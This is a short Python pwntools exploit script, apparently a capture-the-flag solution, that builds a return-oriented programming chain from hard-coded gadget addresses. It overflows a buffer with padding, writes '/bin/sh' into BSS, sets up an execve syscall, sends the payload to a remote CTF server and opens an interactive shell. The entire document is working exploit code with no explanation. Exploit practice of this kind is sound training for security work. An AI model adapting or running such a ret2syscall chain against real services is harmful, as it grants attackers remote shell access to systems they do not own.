from pwn import *
import binascii

context.arch = 'amd64'

####Gadget
BSS = 0x53ea00
pop_rdi = 0x42ed2d             #pop rdi ; ret
pop_rax = 0x404971             #pop rax ; ret
mov_ptr_rdi_rax = 0x44ee6f     #mov qword ptr [rdi], rax ; ret
pop_rdx = 0x447b0f             #pop rdx ; adc al, 0xf6 ; ret
pop_rsi = 0x4072e7             #pop rsi ; dec dword ptr [rax + 0x21] ; ret
syscall = 0x44f609             #syscall ; ret

####pad
#ropchain = b'a'*328    ##336
ropchain = p64(0x427a12)+p64(0xc4200c0000)+b'\x00'*8+p64(0xc4200c0000)+b'\x00'*40+p64(0xc420000180)+b'\x00'*8+p64(0x44e6c1)+b'\x00'*232

####move /bin/sh to [rdi]
ropchain+=p64(pop_rdi)
ropchain+=p64(BSS)
ropchain+=p64(pop_rax)
ropchain+=b'/bin/sh\x00'
ropchain+=p64(mov_ptr_rdi_rax)

####clear rdx rsi
ropchain+=p64(pop_rdx)
ropchain+=p64(0x0)
ropchain+=p64(pop_rax)
ropchain+=p64(BSS)
ropchain+=p64(pop_rsi)
ropchain+=p64(0x0)

####set rax
ropchain+=p64(pop_rax)
ropchain+=p64(0x3b)

####syscall
ropchain+=p64(syscall)

r = remote('csie.ctf.tw',10128)
r.sendline(ropchain)
r.interactive()
